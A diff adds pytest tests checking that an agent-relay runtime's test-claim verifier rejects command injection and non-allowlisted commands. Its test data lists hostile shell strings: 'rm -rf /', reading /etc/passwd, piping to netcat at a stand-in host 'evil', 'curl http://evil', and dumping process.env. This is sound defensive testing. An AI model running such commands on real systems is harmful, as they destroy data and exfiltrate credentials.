@@ -487,3 +487,57 @@ def test_runtime_channel_startup_marker_does_not_increment_restart_churn(tmp_pat
     binding = runtime.ensure_binding("channel-99")
     status_text = (binding.worktree_path / "memory" / "STATUS.md").read_text(encoding="utf-8")
     assert "Resume the same thread and continue without asking for a recap." in status_text
+
+
+def test_verify_test_claim_rejects_shell_metacharacters(tmp_path: Path, monkeypatch) -> None:
+    """`_verify_test_claim` once shelled out via `cmd /c` / `sh -lc`, so any
+    bot-supplied claim like `pytest x; rm -rf /` would be re-interpreted by
+    the shell. The current implementation must short-circuit on shell
+    metacharacters and never reach `subprocess.run`."""
+    repo = tmp_path / "repo"
+    state = tmp_path / "state"
+    _init_git_repo(repo)
+    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="vtc", agent_name="codex")
+    binding = runtime.ensure_binding("vtc-channel")
+
+    called = []
+
+    def explode_run(*args, **kwargs):
+        called.append((args, kwargs))
+        raise AssertionError("subprocess.run must not be invoked for shell-metacharacter claims")
+
+    monkeypatch.setattr(relay_runtime.subprocess, "run", explode_run)
+
+    for malicious in (
+        "pytest tests; rm -rf /",
+        "pytest tests && cat /etc/passwd",
+        "pytest tests | nc evil 443",
+        "pytest tests `whoami`",
+        "pytest tests $(id)",
+        "pytest tests > /tmp/leak",
+    ):
+        status, detail = runtime.verifier._verify_test_claim(binding, malicious)
+        assert status == "unresolved"
+        assert "metacharacters" in detail or "argv" in detail or "allowlisted" in detail
+    assert called == []
+
+
+def test_verify_test_claim_rejects_non_allowlisted_argv(tmp_path: Path, monkeypatch) -> None:
+    repo = tmp_path / "repo"
+    state = tmp_path / "state"
+    _init_git_repo(repo)
+    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="vtc2", agent_name="codex")
+    binding = runtime.ensure_binding("vtc2-channel")
+
+    called = []
+
+    def explode_run(*args, **kwargs):
+        called.append((args, kwargs))
+        raise AssertionError("non-allowlisted argv must not run")
+
+    monkeypatch.setattr(relay_runtime.subprocess, "run", explode_run)
+
+    for not_allowed in ("rm -rf /", "curl http://evil", "node -e 'console.log(process.env)'", "git push --force"):
+        status, _ = runtime.verifier._verify_test_claim(binding, not_allowed)
+        assert status == "unresolved"
+    assert called == []
